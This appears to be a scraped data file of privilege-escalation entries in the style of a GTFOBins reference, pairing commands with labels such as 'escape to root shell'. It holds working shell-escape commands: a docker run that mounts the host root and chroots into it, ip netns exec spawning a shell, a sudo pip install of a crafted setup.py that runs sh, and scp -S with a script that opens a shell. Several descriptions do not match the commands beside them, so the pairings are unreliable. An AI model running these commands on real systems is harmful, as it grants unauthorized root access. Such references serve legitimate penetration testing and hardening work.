commands: ./busctl --user set-property org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.Debug.Stats EnableStats b true

suid.description: Copy files or create SUID binary

commands: sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
sudo ip netns add foo\nsudo ip netns exec foo /bin/sh

suid.description: Read files and escape to shell

sudo.description: Read files and escape to root shell

suid.description: Read files and escape to shell

commands: TF=$(mktemp -d); echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py; sudo pip install $TF

suid.description: Spawn root shell (requires auth or CVE-2021-4034)

commands: TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo scp -S $TF x y:

suid.description: Attach to existing session or use for shell
